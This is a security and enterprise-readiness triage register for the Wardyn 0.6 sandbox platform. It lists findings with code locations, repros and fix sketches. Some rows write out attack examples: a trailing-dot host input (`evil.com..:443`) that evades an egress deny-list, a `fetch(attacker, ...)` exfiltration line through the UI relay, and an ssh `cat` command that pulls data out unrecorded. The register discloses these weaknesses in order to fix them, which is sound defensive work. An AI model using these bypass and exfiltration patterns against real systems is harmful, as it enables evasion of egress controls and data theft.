# Wardyn 0.6 Enterprise-POC Readiness — Triage Register (dedupe + verify pass)

**Method.** Ten enterprise-readiness lenses produced ~40 raw findings. I read the 67-item gap
register, ROADMAP's named-gaps + v1.0 row, THREAT-MODEL §5 residuals, and OPERATIONS' "One replica"
+ "Kubernetes: known gaps" in full, then dropped every raw finding already on those lists, merged
cross-lens duplicates into one row each, and re-severity-rated the rest. I VERIFIED the five most
severe survivors with my own probe against the read-only worktree `/home/cjohn/wt-v06-review`
(@ prep/v0.6 80ec4b85): D1 by compiling and running the trailing-dot bypass repro (denied host
evades the deny key, VetHost resolves it); D3/D8/D13/D14 by reading the exact code paths cited.
Nothing below is on the four known lists; rows with a partial neighbor name it in the last column.
Two merges: **D2** = P2.2+P3.4 (SIEM sink loss), **D3** = P1.1+P5.2 (image SBOM). Table sorted by
(severity, then POC-value). `[V]` = independently verified this pass.

| ID | Title | Sev | Size | POC | Where (file:line) | Repro | Fix sketch | Overlaps-known |
|----|-------|-----|------|-----|-------------------|-------|-----------|----------------|
| D1 [V] | Multi-trailing-dot host + explicit port evades egress deny-list under `allow_all_egress` | high | S | H | internal/egress/proxy/proxy.go:343 (splitHostPort: one TrimSuffix before split); policy.go:304,367 | `evil.com..:443` → splitHostPort yields host `evil.com..`; evalHost/VetHost each strip one dot → `evil.com.`, misses dot-free deny key `evil.com`; allowAll falls through to allow; VetHost resolves `evil.com.`==evil.com and dials it. Confirmed by scratch repro. | In splitHostPort trim the host with `strings.TrimRight(host,".")` AFTER SplitHostPort (one fix normalizes every downstream consumer). | none (distinct from residuals #2/#3 domain-fronting/DNS-tunnel — this is a parser defect defeating an explicit deny) |
| D2 | SIEM webhook/syslog sinks are at-most-once with silent loss and no reachable drop metric | high | M | H | internal/audit/sinks/webhook.go:34-41,131-138; sinks/fanout.go (Drops() no prod caller); internal/api/metrics.go (spool gauge only) | Point a webhook sink at a dead endpoint, emit >4096 events → everything past the 4096 buffer is dropped permanently; `/metrics` shows nothing; only ERROR log lines. Contradicts OPERATIONS "the event stream for SIEMs". | Reuse auditspool.go as a per-sink disk spool with drain-on-recovery; export `wardyn_audit_sink_drops_total{sink}` from Fanout.Drops on the existing /metrics writer. | partial: register #32 (sink TYPES), #40 (pg-write spool) — neither is sink DELIVERY loss |
| D3 [V] | Signed agent images ship no image SBOM and pull the agent CLI unpinned/floating; SBOM is source-only, provenance off, no CVE gate | high | M | H | .github/workflows/release.yml:178,194-199; Makefile:638 (`syft .`); deploy/images/claude-code/Dockerfile:137 (`CLAUDE_CODE_VERSION=stable`),169; codex-cli/Dockerfile | Verified: `make sbom` = `syft . -o cyclonedx-json` (source dir, Go/npm only, 0 OS pkgs); release sbom job runs `make sbom`, never `syft <digest>`; no `cosign attest`; `provenance: false`; no trivy/grype anywhere. `stable` CLI floats per build under one signed tag. | `syft <pushed-digest>` per image + `cosign attest --type cyclonedx`; pin CLAUDE_CODE_VERSION/lockfile; add trivy gate; re-enable provenance. | none |
| D4 | No data-flow / sub-processor / external-services artifact anywhere in the tree | high | S | H | docs/ (absent); nearest partial threatmodel/THREAT-MODEL.md:234-245, OPERATIONS.md upstream-proxy section | `grep -rni 'sub-processor|data flow|data residency|GDPR|no telemetry' docs *.md threatmodel` → 0 relevant hits; a vendor questionnaire's first ask has no consumable answer. | One-page docs/DATA-FLOW.md: outbound destination per component, explicit "no vendor telemetry" (beacon removed in 0.4.x), sub-processors are customer-supplied integrations. | partial: register #25 is the residual-risk disclosure, not the procurement artifact |
| D5 | Audit log is immutable-forever with no retention / redaction / erasure story — silent on GDPR, asymmetric with recordings | high | M | H | internal/db/migrations/0001_init.sql:76-85 (+0004 TRUNCATE guard); OPERATIONS.md:119-130; ENV.md:47 (recordings got a retention knob, audit did not) | UPDATE/DELETE/TRUNCATE all raise "append-only"; Actor is operator/member PII; a human-typed credential captured in Data is unremovable forever; 0 doc hits for GDPR/erasure/retention window. | Time-partitioned audit with operator-invoked partition-drop that itself emits an attested event (or crypto-shredding); documented retention/GDPR bounds in OPERATIONS. | partial: register #33 is hash-chain integrity, not retention/erasure |
| D6 | No per-principal audit dimension or evidence export — "everything developer X did in Q3" is unanswerable | high | M | H | internal/store/auditfilter.go:29-40 (no actor filter); internal/api/audit.go:121-160 (parseAuditFilter ignores actor); cmd/wardyn/commands.go:899-927 (run-scoped CLI only) | `GET /audit?actor=alice@corp.com` — param silently ignored, returns unfiltered feed; per-person evidence needs hand-written SQL joining agent_runs.created_by. | Add `?actor=`/`?created_by=` to AuditFilter (Matches machinery already renders both) + a streaming JSONL export with no offset cap; one OPERATIONS paragraph. | none |
| D7 | First approval a pilot sees is Claude Code's own Datadog telemetry host — neither suppressed nor explained | high | S | H | internal/api/runs_dispatch.go:154 (buildBaseSandboxEnv — no telemetry env); ui/.../network-dialog.tsx:39-57; admitted in DEMO-SCRIPT.md:662-668 | New Run → claude-code → Confined → any task: first pending egress approval is `http-intake.logs.us5.datadoghq.com`, before the host the task needs. `grep DISABLE_TELEMETRY|NONESSENTIAL` internal/ deploy/ → 0. | Set `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` (+`DISABLE_TELEMETRY=1`) in buildBaseSandboxEnv with opt-out; or a curated "Agent telemetry" chip with copy. | none (DEMO-SCRIPT shoot note only) |
| D8 [V] | `wait_for_review` holds are a hard-coded 30s / 16-concurrent with no knob, and the UI promises "waits until you approve or deny" | high | S | H | internal/egress/proxy/approvals.go:84-85; proxy.go:900 (`configureHold(...,0,0)`); network-dialog.tsx:61-63; POLICIES.md:325 (no number) | Verified: `defaultHoldTimeout=30*time.Second`, `defaultMaxHolds=16`, production passes 0,0 → defaults; no policy field/env/Helm value. At 30s the connection is refused with the approval still undecided; 17th concurrent host fails fast. | Add `first_use_hold_seconds`/`max_holds` to RunPolicySpec, plumb through configureHold; document default+cap; soften UI copy to "waits up to N seconds". | none (DEMO-SCRIPT shoot note only) |
| D9 | A run that fails before the agent starts is a reason-less FAILED badge in the cockpit | high | M | H | internal/api/runs_dispatch.go:67-69; internal/types/types.go:115-160 (no error field); ui/.../run-detail-summary-header.tsx:143-150 | Onboard a local_dir that resolves control-plane-side but not on the Docker daemon (or delete the agent image) → POST /runs 201 → FAILED with no exit chip, no reason; error lives only in a `run.dispatch` audit row rendered "dispatched the run". | Add a FailureHint-style field to AgentRun (precedent: record.go RecordResult.FailureHint), stamped by every dispatchRun failure arm, rendered under the state badge. | none |
| D10 | No arm64 artifacts and no distributable install path for a MacBook fleet | high | M | H | .github/workflows/release.yml (`platforms: linux/amd64`); RELEASING.md (no binary assets); runs_policy.go:271 (:latest amd64 fallback); deploy/images/full/Dockerfile:83 (amd64 JAVA_HOME) | `docker pull --platform linux/arm64 ghcr.io/.../wardynd:0.6.0` → no manifest; per-laptop install = clone+Go+Node+pnpm+Docker+`make setup`, nothing an MDM can push, no signed binary. | Add setup-qemu + `linux/amd64,linux/arm64`; publish darwin-arm64/amd64 wardyn CLI release assets; fix full-image JAVA_HOME to arch-neutral. | partial: register #51 is CC3/confinement on macOS, not artifact/arch distribution |
| D11 | No fleet posture / telemetry / support-bundle lane — a wedged laptop daemon is invisible and undiagnosable remotely | high | L | M | deploy/compose/docker-compose.yaml:435 (127.0.0.1 bind); cmd/wardyn/* (no doctor/support-bundle); no posture endpoint in routes.go | As admin, determine any laptop's wardynd version + enforcement posture without a shell on it → no endpoint/command/artifact yields it. | S first step: `wardyn support-bundle` (healthz+version+sanitized env+last N log lines+migration level+sink drop counters) + a posture JSON collectable via MDM. | partial: register #4 (team mode) is a shared server, not fleet inventory for the per-laptop model |
| D12 | OIDC-configured wardynd cannot start off-VPN and stays dead after connectivity returns | high | M | M | internal/auth/oidc/oidc.go:174-215; cmd/wardynd/boot_deps.go:265-287 (30s, fail boot); docker-compose.yaml (no restart on wardynd) | Set WARDYN_OIDC_ISSUER unreachable, `docker compose up wardynd` → exits nonzero after discovery timeout; container stays exited; restore reachability → still down. | Retry OIDC init in background after boot (serve non-SSO surface meanwhile, /healthz `sso:degraded`); at minimum add restart policy + document the roaming pattern. | mechanism at OPERATIONS.md:581-587 (bundled-Dex context) — not the roaming-laptop consequence; not in the 4 dedupe sources |
| D13 [V] | Crash mid-CreateSandbox or lost SetSandboxRef leaks running sandbox containers forever — no docker-side label sweep | high | M | M | internal/api/reconcile.go:134 (`SandboxRef==""` skip); runs_lifecycle.go:227 (SweepTerminalSandboxes same skip),315-322 (teardown only if ref!=""); runs_dispatch.go:413-423 | Verified: both reconcileOrphanedSandbox and SweepTerminalSandboxes `continue` when `run.SandboxRef==""`; finalizeUndispatchedRuns FAILs a ref-empty run but never lists containers; only envbuild/reaper.go calls ContainerList. Crash before SetSandboxRef → proxy/agent/network containers survive every reboot untracked. | Mirror the envbuild reaper: periodic ContainerList filtered on `wardyn.run-id`; tear down any whose run row is terminal/missing/ref-empty past undispatchedGrace, reusing existing label-based teardown. | partial: register #52 is terminal-WITH-ref failed finalize; the ref-EMPTY leak is not covered (and a wired #52 still would not catch it) |
| D14 [V] | UI-sandbox relay is an unaudited browser-pivot egress channel — analyzed only as a console-origin threat, no CSP | high | M | M | internal/api/uigateway.go:171 ("No CSP/X-Frame-Options here"), :9 ("no new network path out"); THREAT-MODEL.md:142 (B10),222 | Verified: relay sets no CSP; TM B10 concludes "no new network path out of the sandbox" — true for the netns, but sandbox-authored JS runs in the OPERATOR's browser, which has ungoverned internet. A `fetch(attacker,{mode:'no-cors',body:stolen})` exfiltrates outside wardyn-proxy; audit records only ui.auth/open/close. | (a) Add the browser-pivot vector to THREAT-MODEL §5 as an explicit residual; (b) serve `Content-Security-Policy: connect-src 'self'` on relay responses; (c) operator ack that opening a run's app runs its code in your browser. | partial: residual #18 (cross-run scripting) and #19 (recording gap) — neither is the proxy-bypass framing |
| D15 | Residual #19's not-recorded set is incomplete: ssh exec output and sftp payloads are content-free on every SSH-enabled run; sftp uploads aren't byte-counted | high | M | M | internal/api/sshgateway_channels.go:611-621 (exec never recorded),639 (bytesOut discarded),192-195/684-687 (outbound-only bytes); SSH.md:223-233 | With the SSH gateway on: `ssh <run>@gw 'cat /work/data.csv' > loot.csv` → audit shows argv+exit only, no content/byte-count/recording; `sftp put` ingress registers ~0 bytes and no filenames. Residual #19's "don't declare ui_apps" guidance doesn't restore replay while WARDYN_SSH_LISTEN is set. | S: correct residual #19 + SSH.md to name exec+sftp. M: log bytesOut for ssh.exec (already computed), count both sftp directions, or per-lane refuse exec/sftp on replay-required runs. | partial: extends residual #19 (which names only ui_apps + `ssh -L`) |
| D16 | No per-principal audit revocation — OIDC human session is a stateless HMAC cookie; logout, IdP-disable, role-demotion have no effect until expiry | med | M | M | internal/auth/oidc/oidc.go:437-441 (logout clears client cookie only),450-465 (middleware: signature+expiry only),417-426 (role frozen at login) | Copy the session cookie, Logout, replay it → still authenticates until Expiry; demote the sub in ROLE_MAP + restart → cookie still returns RoleAdmin; only revoke lever is a global HMAC-key rotation (mass logout). | Add a jti + small revoked-jti / last-valid-issued-at table checked in middleware (revoke-on-logout, revoke-by-sub); or shorten TTL + IdP introspection; document a "revoke a human now" IR procedure. | none (register #38/residual #7 is the minted-token window; #5/#15 are SSH-key stamps) |
| D17 | Human-supplied secrets pasted into recorded terminals are stored cleartext forever, with no single-recording remediation | med | M | M | internal/secretmask/secretmask.go:29-32 + all Add sites (platform values only); internal/recording/pgstore.go:171-181 (age sweep is the only delete); SSH.md:224-227 | Attach, type `export GITHUB_TOKEN=ghp_...` → replay renders it verbatim (never registered → never masked). No delete-one route exists; retention knob deletes by age, not by recording. | S: honest caveat in SSH.md/OPERATIONS ("masking covers platform-managed secrets only"). M: admin `DELETE /recordings/{session}` that emits a `recording.deleted` audit event. | partial: verbatim-only masking is disclosed (§5.1a); the no-single-delete remediation gap is new |
| D18 | Compose stack does not survive a reboot — only the registry container has a restart policy | med | S | M | deploy/compose/docker-compose.yaml:50 (sole `restart: unless-stopped`); postgres/wardynd/proxy have none | `grep -n restart docker-compose.yaml` → one hit; `up -d && reboot` → only registry running. On MacBooks that reboot for weekly MDM windows this is a recurring support burden (compounds D12). | Add `restart: unless-stopped` to postgres/wardynd/proxy. | none |
| D19 | Default agent images float `:latest` — uncontrolled version drift on a version-pinned fleet | med | S | M | internal/api/runs_policy.go:263-271; release.yml float-latest matrix rows | Pin wardynd 0.6.0; a later 0.7 tag re-pushes `agent-claude-code:latest` → any laptop pulling fresh runs a 0.6 daemon driving a 0.7 agent image, outside any change window. | Fall back to the daemon's own version tag (images are published per-semver), `:latest` last resort; document WARDYN_AGENT_IMAGES pinning for fleets. | none |
| D20 | Colima/Lima/podman-machine host sockets are not remapped — only Rancher Desktop's `*.rd/docker.sock` is | med | S | M | scripts/lib/common.sh:117-155 (only `*.rd/docker.sock` in both case statements) | `export DOCKER_HOST=unix://$HOME/.colima/default/docker.sock; scripts/setup.sh` → WARDYN_DOCKER_SOCK becomes the $HOME path; compose bind-mounts a virtiofs socket that fails as Rancher's did pre-fix. | Generalize the remap: any unix socket under $HOME from a VM-backed context maps to /var/run/docker.sock (mirror the Rancher branch). | partial: adoption findings tested Rancher/Lima; the socket-remap generalization isn't written down |
| D21 | No CLI↔daemon version handshake despite explicitly-unstable pre-alpha interfaces | med | S | M | internal/api/server.go:626-631 (version served); cmd/wardyn/* + internal/cliclient (no consumer) | `grep -rn version cmd/wardyn internal/cliclient` → CLI never fetches/compares the daemon version; a skewed CLI (`go install @latest`) against an older daemon fails with raw 404/decode errors. | CLI reads healthz version on first command, warns on major/minor mismatch. | none |
| D22 | UI license gate fails open on SSPL / BUSL / CC-BY-NC / unknown licenses | med | S | M | scripts/check-ui-licenses.sh:16-18 (denylist `A?GPL|LGPL|MPL|EPL` only) | `printf 'SSPL-1.0\nBUSL-1.1\nCC-BY-NC-4.0\nUnknown\n' | grep -Ei '(A?GPL|LGPL|MPL|EPL)'` matches none → script exits 0. Source-available licenses (the ones legal fears most) sail through. Today's tree is clean, so latent. | Invert to an allowlist ({0BSD,Apache-2.0,BSD-*,ISC,MIT,OFL-1.1,CC0-1.0,Unlicense}) and fail on any remainder. ~3 lines. | none |
| D23 | SECURITY.md is stale on its own out-of-scope list and security-contact | med | S | M | SECURITY.md:62-63 ("arbitrary-domain interception is the v0.5 target"),18-21 (security@ "reserved... placeholder") vs ROADMAP.md:290 | v0.5.0 shipped 2026-08-18 without it; ROADMAP now schedules it for v1.0. By the project's own invariant-5 ("a doc claim with no enforcing code is a bug") this is a bug in the doc a reviewer reads first. | One-line edit to "planned for v1.0"; publish security@ (trademark resolved) or state GitHub advisories as canonical. | partial: register #21/#23 is the interception gap itself, not the stale doc claim |
| D24 | No third-party attribution artifact ships; NOTICE punts to "regenerate locally" and omits the bundled OFL fonts | med | S | M | NOTICE:5-14; ui/src/styles/index.css:12-13 (@fontsource Inter/JetBrains Mono, OFL-1.1); release.yml (no attribution asset) | `pnpm licenses list --prod` → OFL-1.1 present; `grep -i 'font\|OFL' NOTICE` → nothing; no THIRD-PARTY-LICENSES generated in CI or attached to releases (npm side uncovered). | `make third-party-notices` (go-licenses report + pnpm licenses list --prod --long) → THIRD-PARTY-LICENSES attached in release.yml; add one OFL paragraph to NOTICE. | none |
| D25 | The ~50-action audit vocabulary and its Data schemas are undocumented — a SIEM/compliance integrator must grep source | med | S | M | emit sites across internal/api,broker,lifecycle,approval,identity; docs cover only authz.denied reasons (OPERATIONS.md:444-460) + 4 ssh.* actions (SSH.md) | "Which action records a UI-app session ending and what Data fields?" — no doc answers; `ui.close`/`auditUI` reachable only by reading Go; nothing marks the vocabulary stable vs internal. | Generate docs/AUDIT-ACTIONS.md from the action literals + a CI check that a new action without a doc row fails; mark stable-with-deprecation like the SDK fields. | none |
| D26 | Inside the sandbox, denied / pending-approval / always-deny are the same invisible CONNECT 403 | med | S | M | internal/egress/proxy/proxy.go:536,624 (identical deny body),748-758 (approval-pending body invisible on CONNECT); attach-bashrc.sh (no guidance) | `curl -v https://unlisted.example` under deny_with_review vs always_deny → byte-identical "CONNECT tunnel failed, 403"; the agent can't tell "retry after approval" from "permanently blocked" and routes around instead of retrying. | Set response HEADERS on the CONNECT refusal (`X-Wardyn-Egress: approval-pending|denied`, `X-Wardyn-Host`) — visible even when bodies are discarded; one line in attach-bashrc. | none |
| D27 | UI-relay session cookie (8h bearer) re-checks only run state, never the principal's current authorization | med | S | M | internal/api/uigateway.go:346-360 (8h cookie, role stamped) vs :400-420/:610-655 (re-checks run.State only) | Admin A opens a UI app, revoke A's admin role → A's browser keeps loading `/r/<run>/...` until the 8h cookie expiry or the run stops; no re-authorization on subsequent connections. | In uiDial re-run the owner-or-admin check against freshly-loaded run + current role for sess.Principal; shorten uiSessionTTL. | partial: register #5 (SSH admin stamp) is SSH-specific; the UI relay cookie is a separate surface |
| D28 | Approve/deny `always` write-back is not atomic with Decide — a PG blip drops a permanent workspace deny behind a 200 | med | S | L | internal/api/approvals.go:262 (Decide),299-301 (post-commit write-back),700-732 (fail-silent-but-audited, no retry) | Fault-inject AddWorkspaceEgressDecision on a deny·always → operator gets 200/decided; the workspace deny row is never created; future runs to that host are never denied; only trace is one failure audit event (none if the daemon crashed). | Pass one tx through Decide + AddWorkspaceEgressDecision; or a boot/periodic reconcile of decided scope=always approvals against workspace egress rows by the `source: approval:<id>` marker. | none |
| D29 | Mint commit vs audit/response non-atomicity — crash after tx.Commit yields a minted credential with no credential.mint event and a burned single-use approval, nothing delivered | med | S | L | internal/broker/broker.go:469-475 (Commit then auditMint),385-388/461-467 (ErrAlreadyMinted); internal/api/internal.go:602-603 | Kill wardynd between Commit and auditMint on a github_token mint → `minted_jti` set, no `credential.mint` row, git helper retry gets 409 already_minted forever; breaks the audit join the trail is designed around. | Write the credential.mint row inside the mint transaction (same pool); treat same-run ErrAlreadyMinted within the TTL as "approval consumed by a crashed mint — re-approve". | partial: adjacent to register #13/residual #7 but neither names the commit-window loss |
| D30 | Audit spool torn-write cascade — the first event spooled after a disk-full episode is silently destroyed despite Append returning success | med | S | L | internal/audit/sinks/auditspool.go:66-72 (single Write, no torn-write recovery),137-143 (Drain drops unparseable) | ENOSPC leaves a newline-less fragment at EOF; the next Append concatenates onto it; Drain fails to unmarshal the merged line and drops it — a silent loss of an event whose primary store write had already failed. | On Append open, if the file doesn't end in '\n', write a leading '\n' (or truncate the trailing partial line) before appending; count torn-line drops. | partial: register #40 lists the pg-write spool as by-design-drains-on-recovery, not this corruption cascade |
| D31 | Audit-event masker lacks the JSON-escaped-variant expansion the recording path has — a special-char secret in ev.Data can slip into the audit log unmasked | med | S | L | cmd/wardynd/adapters.go:233-240 (NewMasker on raw snapshot) vs internal/api/recording.go:176,217-247 (appendJSONEscapedVariants) | ev.Data is JSON; a registered multi-line/quote-bearing secret (e.g. a minted ssh_key PEM) is JSON-escaped in Data and doesn't equal the raw registered bytes, so Mask leaves it intact. Bites only special-char secrets reaching a Data field (ASCII tokens mask fine). | Expand the snapshot with the same escaped variants before NewMasker in maskingRecorder (hoist appendJSONEscapedVariants to a shared helper). | partial: TM:201 scopes JSON-escape handling to the recording path; the audit-path gap is disclosed only by omission |
| D32 | The shipped single-user laptop default collapses the audited insider into the trusted operator — no doc states the topology prerequisite | med | M | M | THREAT-MODEL.md:33-43 (actor table); ENV.md:38 (flagship = no-auth local mode); OPERATIONS.md:120-131 (append-only claims) | On any make-setup laptop the governed dev IS the operator: `docker compose down -v` wipes the "append-only" trail; the dev edits policy/enforcement freely. Every insider-attribution claim is void per-laptop, and no doc states operator≠user is the precondition. | A THREAT-MODEL/OPERATIONS section naming the trust prerequisite and scoping the laptop topology's claims honestly; the real fix is the central control-plane topology. | partial: residual #9 declares insider-admin OOS and register #4 is team mode — neither states the default deployment makes this the norm |
| D33 | The Confined radio says new hosts are "held at the door" while the wizard default fails them fast | low | S | M | ui/.../new-run-screen.tsx:592-594 vs wizard-types.ts:307 (`deny_with_review`) vs network-dialog.tsx:67-69 | New Run → Confined (touch nothing) → launch → sandbox `curl https://example.com` fails immediately; nothing was "held" — two screens tell opposite stories, priming the "doesn't do what it says" impression D8 confirms. | Default Confined to `wait_for_review` (matching its copy) or change the body to "refused and raised for your review." | none |
| D34 | The SBOM generator (syft) is itself installed via `curl|sh` pinned only by a mutable git tag | low | S | L | Makefile:637; ci.yml sbom-stub; release.yml:193-195 | `curl -sSfL .../v1.46.0/install.sh | sh` — no sha256 on the script or binary, unlike every SHA-pinned `uses:` in the same workflows; the tool producing supply-chain evidence is acquired without supply-chain verification. | Use anchore/sbom-action (SHA-pinned) or pin the syft release tarball by sha256. | none |
| D35 | TestAuthzMatrix's "chi.Walk enumerates every route, can't go stale" invariant silently excludes the UI-sandbox gateway listener | low | S | L | internal/api/authz_test.go:28-41 (boundary comment names only SSH),303-308 (walks srv.router only); uigateway.go:161-184 (second listener, never on srv.router) | `grep -c 'gateway\|__wardyn' authz_test.go` → 0; the enter/relay routes are on UIGatewayHandler, invisible to the matrix that routes.go points auditors at as authoritative; a new UI-listener route escapes the "can't go stale" guarantee. Mitigant: uigateway_test.go covers today's behavior (23 tests). | Extend the coverage-boundary comment to name the UI gateway (pointing at uigateway_test.go); optionally chi.Walk a maximal UIGatewayHandler so a new route trips a failing test. | partial: register #61/residual #18 is the substantive shared-origin risk, not this test-coverage/credibility gap |

---

## Recommended build set (fold into campaign scope)

**Blocker/security — do first:**
- **D1** — trailing-dot egress deny bypass. One-line `TrimRight` fix, verified exploitable, defeats an explicit operator deny. Ship the fix + a table-test of `evil.com..:443` in policy_test.

**High-value, S/M — the "week-1 reviewer/pilot hits it" set:**
- **D7** telemetry env kill-switch (S, one line) and **D8** configurable hold window + honest UI copy (S) — both fix the first two things a pilot sees go wrong; both are currently only DEMO-SCRIPT shoot notes.
- **D3** image SBOM + pinned agent CLI + trivy gate + provenance (M) — the concrete answer to the supply-chain questionnaire.
- **D4** DATA-FLOW.md, **D5** audit-retention/GDPR paragraph + lever, **D6** `?actor=`/JSONL export, **D25** AUDIT-ACTIONS.md — the compliance/procurement documentation block; mostly S, high leverage, and Wardyn can answer several favorably (no telemetry, cosign-signed) if it writes them down.
- **D9** FailureHint on AgentRun (M) and **D26** CONNECT-refusal headers (S) — the two day-1 "why did it fail?" gaps.
- **D2** per-sink disk spool + drop metric (M) — makes the SIEM-continuity pitch actually true.
- **D18** restart policies (S), **D19** version-tagged agent-image fallback (S), **D22** allowlist license gate (S), **D23/D24** SECURITY.md + NOTICE fixes (S) — small, cheap credibility wins.
- **D13** label-based sandbox reaper (M) and **D28/D29/D30** the audit/write non-atomicity trio (S each) — correctness/leak fixes; D13 reuses the existing envbuild reaper pattern.

**Fleet-topology track (larger, decide explicitly):**
- **D10** arm64 + darwin CLI binaries, **D11** support-bundle/posture, **D12** OIDC background-retry + restart, **D16** session revocation, **D21** version handshake, **D20** Colima remap. These are the "500 MacBooks" reality. D10/D11/D12/D18/D20 together are the difference between "runs on a maintainer's laptop" and "pilotable on a managed fleet." D20 (Colima) is S and likely blocking for any Docker-Desktop-licensing-refusing shop.

## Defer / won't

- **D14** (UI-relay browser-pivot), **D15** (ssh exec/sftp not recorded), **D17** (human-typed secrets in recordings), **D27** (relay 8h cookie), **D32** (laptop=operator), **D35** (authz-matrix coverage) — these are **document-the-residual** items, not code fixes for the POC. Add each to THREAT-MODEL §5 as an explicit residual and (for D14) optionally the CSP `connect-src 'self'`; they are honest-disclosure gaps, not shippable features. D14/D27's real fixes and D32's topology fix are v1.0-class.
- **D31** (audit masker JSON-escape) — real inconsistency but narrow trigger (special-char secret reaching a Data field); one-line reuse fix, low urgency — batch with D3-era hardening, not a standalone lane.
- **D33** (Confined copy) — one-line copy edit, fold into whatever UI lane touches new-run.
- **D34** (syft curl|sh) — low; do it when D3 rewrites the SBOM job anyway (anchore/sbom-action replaces both).
